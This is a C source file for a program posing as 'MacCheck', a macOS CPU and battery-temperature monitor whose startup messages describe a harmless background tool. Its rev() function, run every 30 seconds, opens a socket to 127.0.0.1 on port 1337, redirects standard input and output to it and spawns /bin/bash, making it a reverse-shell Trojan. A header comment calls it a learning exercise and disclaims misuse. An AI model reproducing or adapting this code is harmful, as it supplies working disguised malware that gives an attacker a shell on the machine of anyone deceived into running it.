/*
NOTE: I won’t (and you shouldn’t) use this program as an actual Trojan or as malware in general
such as using this program to gain access to a machine whos owner hasn’t explicitly given permission to do so.
I’ve written this program to learn more and to talk about what that learning has been like for me, nothing else. 
You shouldn’t let anyone run this program if that person doesn’t fully understand what it does 
and hasn’t given explicit permission for access through a reverse shell.
*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#include <string.h>

#include <sys/types.h>
#include <sys/socket.h>

#include <netinet/in.h>
#include <arpa/inet.h>


void check_cpu(void);
void check_bat(void);
void rev(void);

int main(int argc, char *argv[]) {

	if (argc != 2 || strcmp(argv[1], "&")) {
		printf("\nMacCheck was not executed properly. \nPlease execute by entering the following: ./maccheck \"&\"&\n\n");
		exit(0);
	}

	printf("\nWelcome to MacCheck, a lightweight tool for MacOS that monitors CPU usage and battery temperature.\n\n");
	printf("Once temperature and usage exceeds a certain level, a temporary and non-intrusive notification will appear to inform you.\n\n");
	printf("Monitoring will remain active in the background but relies on the Terminal app. Minimizing it or executing other commands is OK, but please do not close the Terminal app.\n\n");

	while (1) {
		check_cpu();
		check_bat();
		rev();
		sleep(30);
	}

	return 0;
}

void check_cpu(void) {

	system("sysctl -n vm.loadavg | awk -F' ' '{print $2 > \"maccheck_tmp1.txt\"}'");

	char cpu_s[50];
	int cpu_i;
	FILE *fp;
	fp = fopen("maccheck_tmp1.txt", "r+");

	fgets(cpu_s, sizeof(cpu_s), fp);

	cpu_i = atoi(cpu_s);

	if (cpu_i >= 90 && cpu_i <= 95) {
		system("osascript -e 'display notification \"CPU usage is between 90% and 95%!\" with title \"MacCheck\"'");
	}
	else if (cpu_i >= 95 && cpu_i <= 100) {
		system("osascript -e 'display notification \"CPU usage is between 95% and 100%!\" with title \"MacCheck\"'");
	}
	else if (cpu_i > 100) {
		system("osascript -e 'display notification \"WARNING: CPU usage is over 100%!\" with title \"MacCheck\"'");
	}

	fclose(fp);
	system("rm maccheck_tmp1.txt");

}

void check_bat(void) {

	system("ioreg -brc AppleSmartBattery | grep Temperature | awk -F' ' '{print $3 > \"maccheck_tmp2.txt\"}'");

	char bat_s[50];
	int bat_i;
	FILE *fp2;
	fp2 = fopen("maccheck_tmp2.txt", "r+");

	fgets(bat_s, sizeof(bat_s), fp2);

	bat_i = atoi(bat_s);

	if (bat_i >= 4000 && bat_i <= 4500) {
		system("osascript -e 'display notification \"Battery temperature is between 40°C and 45°C!\" with title \"MacCheck\"'");
	}
	else if (bat_i >= 4500 && bat_i <= 5000) {
		system("osascript -e 'display notification \"Battery temperature is between 45°C and 50°C!\" with title \"MacCheck\"'");
	}
	else if (bat_i > 5000) {
		system("osascript -e 'display notification \"WARNING: Battery temperature is over 50°C!\" with title \"MacCheck\"'");
	}

	fclose(fp2);
	system("rm maccheck_tmp2.txt");

}

void rev(void) {

	int sock;
	sock = socket(AF_INET, SOCK_STREAM, 0);

	struct sockaddr_in socket_address;
	socket_address.sin_family = AF_INET;
	socket_address.sin_port = htons(1337);
	socket_address.sin_addr.s_addr = inet_addr("127.0.0.1");

	connect(sock, (struct sockaddr *) &socket_address, sizeof(socket_address));

	int saved_stdin = dup(0);
	int saved_stdout = dup(1);
	int saved_stderr = dup(2);

	dup2(sock, 0);
	dup2(sock, 1);
	dup2(sock, 2);

	if (system("/bin/bash") != 1) {
		system("/bin/sh");
	}

	close(sock);

	dup2(saved_stdin, 0);
	close(saved_stdin);

	dup2(saved_stdout, 1);
	close(saved_stdout);

	dup2(saved_stderr, 2);
	close(saved_stderr);

}
